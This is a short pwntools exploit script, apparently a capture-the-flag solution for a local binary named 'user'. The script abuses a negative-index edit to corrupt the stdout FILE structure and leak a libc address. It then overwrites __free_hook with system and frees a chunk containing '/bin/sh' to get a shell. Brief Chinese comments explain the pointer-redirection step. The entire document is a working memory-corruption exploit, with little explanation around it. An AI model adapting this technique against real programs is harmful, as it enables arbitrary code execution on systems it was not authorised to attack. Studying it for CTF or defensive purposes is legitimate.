from pwn import *
context.log_level='debug'
p=process("./user")
libc = ELF("./libc.so.6")

def add(content):
    p.sendlineafter(b"5. Exit", b"1")
    p.sendafter(b"Enter your username:", content)

def delete(idx):
    p.sendlineafter(b"5. Exit", b"2")
    p.sendlineafter(b"index:", str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b"5. Exit", b"4")
    p.sendlineafter(b"index:", str(idx).encode())
    p.sendafter(b"Enter a new username:", content)

add(b'fuchen01')
add(b'/bin/sh\x00')
add(b'fuchen03')
delete(0)
stdout = p64(0xfbad1800)+p64(0)*3+b"\x00"
edit(-8,stdout)
gdb.attach(p,'b *$rebase(0x162b)')
pause()
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b"\x00"))-0x1ec980
success("libc_base: "+hex(libc_base))
#这里有一个回环指针就把这个地址的值改成__free_hook的地址，重点是找到这个回环地址
edit(-11,p64(libc_base + libc.sym["__free_hook"]))
#然后继续将free_hook的地址改成system的地址
edit(-11,p64(libc_base + libc.sym["system"]))
pause()
delete(1)
p.interactive()